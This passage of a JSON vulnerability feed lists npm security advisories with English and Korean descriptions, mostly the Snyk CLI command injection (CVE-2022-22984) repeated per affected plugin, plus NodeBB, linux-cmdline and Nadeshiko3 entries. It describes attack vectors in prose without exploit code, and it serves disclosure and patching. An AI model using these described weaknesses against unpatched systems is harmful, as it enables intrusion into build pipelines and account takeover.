    "descriptionKR": "1.1064.0 이전의 패키지 snyk; 패키지 snyk-mvn-plugin 2.31.3 이전; 패키지 snyk-gradle-plugin 3.24.5 이전; 패키지 @snyk/snyk-cocoapods-plugin 2.5.3 이전; 패키지 snyk-sbt-plugin 2.16.2 이전; 패키지 snyk-python-plugin 1.24.2 이전; 패키지 snyk-docker-plugin 5.6.5 이전; 1.1.6 이전의 패키지 @snyk/snyk-hex-plugin은 [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK에 대한 불완전한 수정으로 인해 명령 주입에 취약합니다. -3037342). 악용에 성공하면 공격자는 조작된 명령줄 플래그를 전달하여 Snyk CLI가 설치된 호스트 시스템에서 임의의 명령을 실행할 수 있습니다. 이 취약점을 악용하려면 사용자는 신뢰할 수 없는 파일에서 snyk test 명령을 실행해야 합니다. 대부분의 경우 Snyk CLI에 대한 명령줄 인수를 제어하도록 배치된 공격자는 이미 임의의 명령을 실행하도록 배치되어 있습니다. 그러나 이는 개발자가 통합/빌드 파이프라인에 대한 더 광범위한 공격의 일부로 이 구성 요소를 활용하기 위해 Snyk CLI에 전달된 인수를 제어할 수 있는 지속적인 통합 파이프라인과 같은 특정 시나리오에서 남용될 수 있습니다. 이 문제는 2022년 11월 29일 현재 https://hub.docker.com/r/snyk/snyk에서 제공되는 최신 Snyk Docker 이미지에서 해결되었습니다. 해당 날짜 이전에 다운로드 및 빌드된 이미지는 업데이트해야 합니다. 이 문제는 버전 v20221130.093605의 Snyk TeamCity CI/CD 플러그인에서도 해결되었습니다."
  },
  {
    "description": "The package snyk before 1.1064.0; the package snyk-mvn-plugin before 2.31.3; the package snyk-gradle-plugin before 3.24.5; the package @snyk/snyk-cocoapods-plugin before 2.5.3; the package snyk-sbt-plugin before 2.16.2; the package snyk-python-plugin before 1.24.2; the package snyk-docker-plugin before 5.6.5; the package @snyk/snyk-hex-plugin before 1.1.6 are vulnerable to Command Injection due to an incomplete fix for [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342). A successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags. In order to exploit this vulnerability, a user would have to execute the snyk test command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline. This issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated. The issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.",
    "identifiers": "GHSA : GHSA-4x6g-3cmx-w76r\nCVE : CVE-2022-22984",
    "severity": "MODERATE",
    "updatedAt": "2023-08-08T21:30:43Z",
    "publishedAt": "2022-11-30T15:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-22984\nhttps://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a\nhttps://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381\nhttps://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357\nhttps://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009\nhttps://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3\nhttps://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50\nhttps://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4\nhttps://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437\nhttps://security.snyk.io/vuln/SNYK-JS-SNYK-3038622\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKDOCKERPLUGIN-3039679\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKGRADLEPLUGIN-3038624\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKMVNPLUGIN-3038623\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKPYTHONPLUGIN-3039677\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSBTPLUGIN-3038626\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSNYKCOCOAPODSPLUGIN-3038625\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSNYKHEXPLUGIN-3039680\nhttps://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/\nhttps://github.com/advisories/GHSA-4x6g-3cmx-w76r",
    "name": "@snyk/snyk-hex-plugin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.1.6",
    "identifier": "1.1.6",
    "descriptionKR": "1.1064.0 이전의 패키지 snyk; 패키지 snyk-mvn-plugin 2.31.3 이전; 패키지 snyk-gradle-plugin 3.24.5 이전; 패키지 @snyk/snyk-cocoapods-plugin 2.5.3 이전; 패키지 snyk-sbt-plugin 2.16.2 이전; 패키지 snyk-python-plugin 1.24.2 이전; 패키지 snyk-docker-plugin 5.6.5 이전; 1.1.6 이전의 패키지 @snyk/snyk-hex-plugin은 [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK에 대한 불완전한 수정으로 인해 명령 주입에 취약합니다. -3037342). 악용에 성공하면 공격자는 조작된 명령줄 플래그를 전달하여 Snyk CLI가 설치된 호스트 시스템에서 임의의 명령을 실행할 수 있습니다. 이 취약점을 악용하려면 사용자는 신뢰할 수 없는 파일에서 snyk test 명령을 실행해야 합니다. 대부분의 경우 Snyk CLI에 대한 명령줄 인수를 제어하도록 배치된 공격자는 이미 임의의 명령을 실행하도록 배치되어 있습니다. 그러나 이는 개발자가 통합/빌드 파이프라인에 대한 더 광범위한 공격의 일부로 이 구성 요소를 활용하기 위해 Snyk CLI에 전달된 인수를 제어할 수 있는 지속적인 통합 파이프라인과 같은 특정 시나리오에서 남용될 수 있습니다. 이 문제는 2022년 11월 29일 현재 https://hub.docker.com/r/snyk/snyk에서 제공되는 최신 Snyk Docker 이미지에서 해결되었습니다. 해당 날짜 이전에 다운로드 및 빌드된 이미지는 업데이트해야 합니다. 이 문제는 버전 v20221130.093605의 Snyk TeamCity CI/CD 플러그인에서도 해결되었습니다."
  },
  {
    "description": "The package snyk before 1.1064.0; the package snyk-mvn-plugin before 2.31.3; the package snyk-gradle-plugin before 3.24.5; the package @snyk/snyk-cocoapods-plugin before 2.5.3; the package snyk-sbt-plugin before 2.16.2; the package snyk-python-plugin before 1.24.2; the package snyk-docker-plugin before 5.6.5; the package @snyk/snyk-hex-plugin before 1.1.6 are vulnerable to Command Injection due to an incomplete fix for [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342). A successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags. In order to exploit this vulnerability, a user would have to execute the snyk test command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline. This issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated. The issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.",
    "identifiers": "GHSA : GHSA-4x6g-3cmx-w76r\nCVE : CVE-2022-22984",
    "severity": "MODERATE",
    "updatedAt": "2023-08-08T21:30:43Z",
    "publishedAt": "2022-11-30T15:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-22984\nhttps://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a\nhttps://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381\nhttps://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357\nhttps://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009\nhttps://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3\nhttps://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50\nhttps://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4\nhttps://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437\nhttps://security.snyk.io/vuln/SNYK-JS-SNYK-3038622\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKDOCKERPLUGIN-3039679\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKGRADLEPLUGIN-3038624\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKMVNPLUGIN-3038623\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKPYTHONPLUGIN-3039677\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSBTPLUGIN-3038626\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSNYKCOCOAPODSPLUGIN-3038625\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSNYKHEXPLUGIN-3039680\nhttps://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/\nhttps://github.com/advisories/GHSA-4x6g-3cmx-w76r",
    "name": "snyk-python-plugin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.24.2",
    "identifier": "1.24.2",
    "descriptionKR": "1.1064.0 이전의 패키지 snyk; 패키지 snyk-mvn-plugin 2.31.3 이전; 패키지 snyk-gradle-plugin 3.24.5 이전; 패키지 @snyk/snyk-cocoapods-plugin 2.5.3 이전; 패키지 snyk-sbt-plugin 2.16.2 이전; 패키지 snyk-python-plugin 1.24.2 이전; 패키지 snyk-docker-plugin 5.6.5 이전; 1.1.6 이전의 패키지 @snyk/snyk-hex-plugin은 [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK에 대한 불완전한 수정으로 인해 명령 주입에 취약합니다. -3037342). 악용에 성공하면 공격자는 조작된 명령줄 플래그를 전달하여 Snyk CLI가 설치된 호스트 시스템에서 임의의 명령을 실행할 수 있습니다. 이 취약점을 악용하려면 사용자는 신뢰할 수 없는 파일에서 snyk test 명령을 실행해야 합니다. 대부분의 경우 Snyk CLI에 대한 명령줄 인수를 제어하도록 배치된 공격자는 이미 임의의 명령을 실행하도록 배치되어 있습니다. 그러나 이는 개발자가 통합/빌드 파이프라인에 대한 더 광범위한 공격의 일부로 이 구성 요소를 활용하기 위해 Snyk CLI에 전달된 인수를 제어할 수 있는 지속적인 통합 파이프라인과 같은 특정 시나리오에서 남용될 수 있습니다. 이 문제는 2022년 11월 29일 현재 https://hub.docker.com/r/snyk/snyk에서 제공되는 최신 Snyk Docker 이미지에서 해결되었습니다. 해당 날짜 이전에 다운로드 및 빌드된 이미지는 업데이트해야 합니다. 이 문제는 버전 v20221130.093605의 Snyk TeamCity CI/CD 플러그인에서도 해결되었습니다."
  },
  {
    "description": "The package snyk before 1.1064.0; the package snyk-mvn-plugin before 2.31.3; the package snyk-gradle-plugin before 3.24.5; the package @snyk/snyk-cocoapods-plugin before 2.5.3; the package snyk-sbt-plugin before 2.16.2; the package snyk-python-plugin before 1.24.2; the package snyk-docker-plugin before 5.6.5; the package @snyk/snyk-hex-plugin before 1.1.6 are vulnerable to Command Injection due to an incomplete fix for [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342). A successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags. In order to exploit this vulnerability, a user would have to execute the snyk test command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline. This issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated. The issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.",
    "identifiers": "GHSA : GHSA-4x6g-3cmx-w76r\nCVE : CVE-2022-22984",
    "severity": "MODERATE",
    "updatedAt": "2023-08-08T21:30:43Z",
    "publishedAt": "2022-11-30T15:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-22984\nhttps://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a\nhttps://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381\nhttps://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357\nhttps://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009\nhttps://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3\nhttps://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50\nhttps://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4\nhttps://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437\nhttps://security.snyk.io/vuln/SNYK-JS-SNYK-3038622\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKDOCKERPLUGIN-3039679\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKGRADLEPLUGIN-3038624\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKMVNPLUGIN-3038623\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKPYTHONPLUGIN-3039677\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSBTPLUGIN-3038626\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSNYKCOCOAPODSPLUGIN-3038625\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSNYKHEXPLUGIN-3039680\nhttps://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/\nhttps://github.com/advisories/GHSA-4x6g-3cmx-w76r",
    "name": "snyk-sbt-plugin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.16.2",
    "identifier": "2.16.2",
    "descriptionKR": "1.1064.0 이전의 패키지 snyk; 패키지 snyk-mvn-plugin 2.31.3 이전; 패키지 snyk-gradle-plugin 3.24.5 이전; 패키지 @snyk/snyk-cocoapods-plugin 2.5.3 이전; 패키지 snyk-sbt-plugin 2.16.2 이전; 패키지 snyk-python-plugin 1.24.2 이전; 패키지 snyk-docker-plugin 5.6.5 이전; 1.1.6 이전의 패키지 @snyk/snyk-hex-plugin은 [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK에 대한 불완전한 수정으로 인해 명령 주입에 취약합니다. -3037342). 악용에 성공하면 공격자는 조작된 명령줄 플래그를 전달하여 Snyk CLI가 설치된 호스트 시스템에서 임의의 명령을 실행할 수 있습니다. 이 취약점을 악용하려면 사용자는 신뢰할 수 없는 파일에서 snyk test 명령을 실행해야 합니다. 대부분의 경우 Snyk CLI에 대한 명령줄 인수를 제어하도록 배치된 공격자는 이미 임의의 명령을 실행하도록 배치되어 있습니다. 그러나 이는 개발자가 통합/빌드 파이프라인에 대한 더 광범위한 공격의 일부로 이 구성 요소를 활용하기 위해 Snyk CLI에 전달된 인수를 제어할 수 있는 지속적인 통합 파이프라인과 같은 특정 시나리오에서 남용될 수 있습니다. 이 문제는 2022년 11월 29일 현재 https://hub.docker.com/r/snyk/snyk에서 제공되는 최신 Snyk Docker 이미지에서 해결되었습니다. 해당 날짜 이전에 다운로드 및 빌드된 이미지는 업데이트해야 합니다. 이 문제는 버전 v20221130.093605의 Snyk TeamCity CI/CD 플러그인에서도 해결되었습니다."
  },
  {
    "description": "The package snyk before 1.1064.0; the package snyk-mvn-plugin before 2.31.3; the package snyk-gradle-plugin before 3.24.5; the package @snyk/snyk-cocoapods-plugin before 2.5.3; the package snyk-sbt-plugin before 2.16.2; the package snyk-python-plugin before 1.24.2; the package snyk-docker-plugin before 5.6.5; the package @snyk/snyk-hex-plugin before 1.1.6 are vulnerable to Command Injection due to an incomplete fix for [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342). A successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags. In order to exploit this vulnerability, a user would have to execute the snyk test command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline. This issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated. The issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.",
    "identifiers": "GHSA : GHSA-4x6g-3cmx-w76r\nCVE : CVE-2022-22984",
    "severity": "MODERATE",
    "updatedAt": "2023-08-08T21:30:43Z",
    "publishedAt": "2022-11-30T15:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-22984\nhttps://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a\nhttps://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381\nhttps://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357\nhttps://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009\nhttps://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3\nhttps://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50\nhttps://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4\nhttps://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437\nhttps://security.snyk.io/vuln/SNYK-JS-SNYK-3038622\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKDOCKERPLUGIN-3039679\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKGRADLEPLUGIN-3038624\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKMVNPLUGIN-3038623\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKPYTHONPLUGIN-3039677\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSBTPLUGIN-3038626\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSNYKCOCOAPODSPLUGIN-3038625\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSNYKHEXPLUGIN-3039680\nhttps://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/\nhttps://github.com/advisories/GHSA-4x6g-3cmx-w76r",
    "name": "snyk-mvn-plugin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.31.3",
    "identifier": "2.31.3",
    "descriptionKR": "1.1064.0 이전의 패키지 snyk; 패키지 snyk-mvn-plugin 2.31.3 이전; 패키지 snyk-gradle-plugin 3.24.5 이전; 패키지 @snyk/snyk-cocoapods-plugin 2.5.3 이전; 패키지 snyk-sbt-plugin 2.16.2 이전; 패키지 snyk-python-plugin 1.24.2 이전; 패키지 snyk-docker-plugin 5.6.5 이전; 1.1.6 이전의 패키지 @snyk/snyk-hex-plugin은 [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK에 대한 불완전한 수정으로 인해 명령 주입에 취약합니다. -3037342). 악용에 성공하면 공격자는 조작된 명령줄 플래그를 전달하여 Snyk CLI가 설치된 호스트 시스템에서 임의의 명령을 실행할 수 있습니다. 이 취약점을 악용하려면 사용자는 신뢰할 수 없는 파일에서 snyk test 명령을 실행해야 합니다. 대부분의 경우 Snyk CLI에 대한 명령줄 인수를 제어하도록 배치된 공격자는 이미 임의의 명령을 실행하도록 배치되어 있습니다. 그러나 이는 개발자가 통합/빌드 파이프라인에 대한 더 광범위한 공격의 일부로 이 구성 요소를 활용하기 위해 Snyk CLI에 전달된 인수를 제어할 수 있는 지속적인 통합 파이프라인과 같은 특정 시나리오에서 남용될 수 있습니다. 이 문제는 2022년 11월 29일 현재 https://hub.docker.com/r/snyk/snyk에서 제공되는 최신 Snyk Docker 이미지에서 해결되었습니다. 해당 날짜 이전에 다운로드 및 빌드된 이미지는 업데이트해야 합니다. 이 문제는 버전 v20221130.093605의 Snyk TeamCity CI/CD 플러그인에서도 해결되었습니다."
  },
  {
    "description": "The package snyk before 1.1064.0; the package snyk-mvn-plugin before 2.31.3; the package snyk-gradle-plugin before 3.24.5; the package @snyk/snyk-cocoapods-plugin before 2.5.3; the package snyk-sbt-plugin before 2.16.2; the package snyk-python-plugin before 1.24.2; the package snyk-docker-plugin before 5.6.5; the package @snyk/snyk-hex-plugin before 1.1.6 are vulnerable to Command Injection due to an incomplete fix for [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342). A successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags. In order to exploit this vulnerability, a user would have to execute the snyk test command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline. This issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated. The issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.",
    "identifiers": "GHSA : GHSA-4x6g-3cmx-w76r\nCVE : CVE-2022-22984",
    "severity": "MODERATE",
    "updatedAt": "2023-08-08T21:30:43Z",
    "publishedAt": "2022-11-30T15:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-22984\nhttps://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a\nhttps://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381\nhttps://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357\nhttps://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009\nhttps://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3\nhttps://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50\nhttps://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4\nhttps://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437\nhttps://security.snyk.io/vuln/SNYK-JS-SNYK-3038622\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKDOCKERPLUGIN-3039679\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKGRADLEPLUGIN-3038624\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKMVNPLUGIN-3038623\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKPYTHONPLUGIN-3039677\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSBTPLUGIN-3038626\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSNYKCOCOAPODSPLUGIN-3038625\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSNYKHEXPLUGIN-3039680\nhttps://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/\nhttps://github.com/advisories/GHSA-4x6g-3cmx-w76r",
    "name": "snyk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.1064.0",
    "identifier": "1.1064.0",
    "descriptionKR": "1.1064.0 이전의 패키지 snyk; 패키지 snyk-mvn-plugin 2.31.3 이전; 패키지 snyk-gradle-plugin 3.24.5 이전; 패키지 @snyk/snyk-cocoapods-plugin 2.5.3 이전; 패키지 snyk-sbt-plugin 2.16.2 이전; 패키지 snyk-python-plugin 1.24.2 이전; 패키지 snyk-docker-plugin 5.6.5 이전; 1.1.6 이전의 패키지 @snyk/snyk-hex-plugin은 [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK에 대한 불완전한 수정으로 인해 명령 주입에 취약합니다. -3037342). 악용에 성공하면 공격자는 조작된 명령줄 플래그를 전달하여 Snyk CLI가 설치된 호스트 시스템에서 임의의 명령을 실행할 수 있습니다. 이 취약점을 악용하려면 사용자는 신뢰할 수 없는 파일에서 snyk test 명령을 실행해야 합니다. 대부분의 경우 Snyk CLI에 대한 명령줄 인수를 제어하도록 배치된 공격자는 이미 임의의 명령을 실행하도록 배치되어 있습니다. 그러나 이는 개발자가 통합/빌드 파이프라인에 대한 더 광범위한 공격의 일부로 이 구성 요소를 활용하기 위해 Snyk CLI에 전달된 인수를 제어할 수 있는 지속적인 통합 파이프라인과 같은 특정 시나리오에서 남용될 수 있습니다. 이 문제는 2022년 11월 29일 현재 https://hub.docker.com/r/snyk/snyk에서 제공되는 최신 Snyk Docker 이미지에서 해결되었습니다. 해당 날짜 이전에 다운로드 및 빌드된 이미지는 업데이트해야 합니다. 이 문제는 버전 v20221130.093605의 Snyk TeamCity CI/CD 플러그인에서도 해결되었습니다."
  },
  {
    "description": "Nako3edit is the editor component of Nadeshiko 3, a programming language developed based on Japanese. Improper check or handling of exceptional conditions in Nako3edit v3.3.74 and earlier allows a remote attacker to inject an invalid value to decodeURIComponent of nako3edit, which may lead the server to crash.",
    "identifiers": "GHSA : GHSA-x2jx-w3wm-9p3p\nCVE : CVE-2022-41777",
    "severity": "MODERATE",
    "updatedAt": "2023-01-31T05:03:03Z",
    "publishedAt": "2022-12-05T06:30:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-41777\nhttps://github.com/kujirahand/nadesiko3/issues/1325\nhttps://github.com/kujirahand/nadesiko3/issues/1347\nhttps://jvn.jp/en/jp/JVN56968681/index.html\nhttps://github.com/kujirahand/nadesiko3/releases/tag/3.3.75\nhttps://github.com/advisories/GHSA-x2jx-w3wm-9p3p",
    "name": "nadesiko3",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.3.75",
    "identifier": "3.3.75",
    "descriptionKR": "Nako3edit는 일본어를 기반으로 개발된 프로그래밍 언어인 Nadeshiko 3의 편집기 구성 요소입니다. Nako3edit v3.3.74 이하에서 예외 조건을 잘못 확인하거나 처리하면 원격 공격자가 잘못된 값을 nako3edit의 decodeURIComponent에 주입하여 서버가 충돌할 수 있습니다."
  },
  {
    "description": "The package linux-cmdline is a parser for Linux kernel command line arguments. Versions before 1.0.1 are vulnerable to Prototype Pollution via the constructor.",
    "identifiers": "GHSA : GHSA-2c29-wc65-4cx9\nCVE : CVE-2020-7704",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-31T05:02:17Z",
    "publishedAt": "2022-05-24T17:26:04Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-7704\nhttps://github.com/piranna/linux-cmdline/commit/53c61a88bc47eb25d71832205056beaab95cf677\nhttps://snyk.io/vuln/SNYK-JS-LINUXCMDLINE-598674\nhttps://github.com/advisories/GHSA-2c29-wc65-4cx9",
    "name": "linux-cmdline",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.1",
    "identifier": "1.0.1",
    "descriptionKR": "linux-cmdline 패키지는 Linux 커널 명령줄 인수용 파서입니다. 1.0.1 이전 버전은 생성자를 통한 Prototype Pollution에 취약합니다."
  },
  {
    "description": "### Impact\nDue to a plain object with a prototype being used in socket.io message handling a specially crafted payload can be used to impersonate other users and takeover accounts.\n\n### Patches\nPatched in 2.6.1\n\n### Workarounds\nSite maintainers can cherry-pick https://github.com/NodeBB/NodeBB/commit/48d143921753914da45926cca6370a92ed0c46b8 into their codebase to patch the exploit.\n\n### For more information\nIf you have any questions or comments about this advisory:\n\nDiscuss it on [our community forum](https://github.com/NodeBB/NodeBB/security/advisories/community.nodebb.org/)\nEmail us at [support@nodebb.org](mailto:support@nodebb.org)\n",
    "identifiers": "GHSA : GHSA-rf3g-v8p5-p675\nCVE : CVE-2022-46164",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-31T05:02:51Z",
    "publishedAt": "2022-12-05T23:06:14Z",
    "references": "https://github.com/NodeBB/NodeBB/security/advisories/GHSA-rf3g-v8p5-p675\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-46164\nhttps://github.com/NodeBB/NodeBB/commit/48d143921753914da45926cca6370a92ed0c46b8\nhttps://github.com/NodeBB/NodeBB/releases/tag/v2.6.1\nhttps://github.com/advisories/GHSA-rf3g-v8p5-p675",
    "name": "nodebb",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.6.1",
    "identifier": "2.6.1",
